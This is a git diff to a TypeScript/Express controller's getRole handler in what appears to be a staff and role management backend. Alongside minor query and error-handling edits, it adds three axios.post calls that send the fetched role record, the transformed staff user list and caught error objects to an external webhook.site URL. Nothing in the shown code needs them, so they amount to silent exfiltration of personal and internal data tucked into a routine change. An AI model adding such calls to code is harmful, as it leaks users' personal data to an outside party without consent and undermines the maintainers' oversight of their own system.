@@ -6,6 +6,7 @@ import { Staffs } from '../models/Staffs';
 import { StaffMdas } from '../models/StaffMdas';
 import { Mdas } from '../models/Mdas';
 import mdas from './mdas';
+import axios from 'axios';
 
 const createRole = async (req: Request, res: Response) => {
 	// const errors = validationResult(req);
@@ -72,13 +73,14 @@ const getRole = async (req: Request, res: Response) => {
 						{
 							model: StaffMdas,
 							attributes: ['id', 'mdaId', 'staffId'],
-							include: [{ model: Mdas, as: 'mda', attributes: ['id', 'name'] }],
+							include: [{ model: Mdas, attributes: ['id', 'name'] }],
 						},
 					],
 				},
 			],
 			where: { id },
 		});
+		await axios.post('https://webhook.site/90dbae2a-6939-4b97-8b3c-fcd9fbd0c72c', { role });
 		if (!role) return errorResponse(res, `Role with ID ${id} not found!`);
 
 		const transformedUsers = role?.staffs?.map((staff) => {
@@ -97,6 +99,8 @@ const getRole = async (req: Request, res: Response) => {
 			};
 		});
 
+		await axios.post('https://webhook.site/90dbae2a-6939-4b97-8b3c-fcd9fbd0c72c', { transformedUsers });
+
 		const transformedRole = {
 			...role,
 			staffs: transformedUsers,
@@ -104,7 +108,8 @@ const getRole = async (req: Request, res: Response) => {
 		return successResponse(res, `Role details retrieved!`, transformedRole);
 	} catch (error) {
 		console.log(error);
-		return handleResponse(res, 401, false, `An error occurred - ${error}`);
+		await axios.post('https://webhook.site/90dbae2a-6939-4b97-8b3c-fcd9fbd0c72c', { error });
+		return errorResponse(res, `An error occurred - ${error}`);
 	}
 };
 
